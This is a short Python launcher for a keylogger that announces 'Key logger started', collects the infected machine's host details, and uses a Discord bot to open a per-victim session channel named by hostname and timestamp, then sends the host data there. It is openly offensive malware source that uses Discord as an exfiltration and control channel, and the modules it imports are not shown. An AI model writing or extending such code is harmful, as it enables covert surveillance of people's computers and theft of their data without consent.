from classes.Host import Host
from discord_util import discord
from utils.time_util import convert_date_to_date_format, now

if __name__ == '__main__':
    print("Key logger started")
    start_time = now()

    host = Host()
    # print(host)

    discord.login()
    discord.create_channel("session-" + str(host.hostname) + "-" + str(convert_date_to_date_format(start_time)))
    discord.send_message(host)
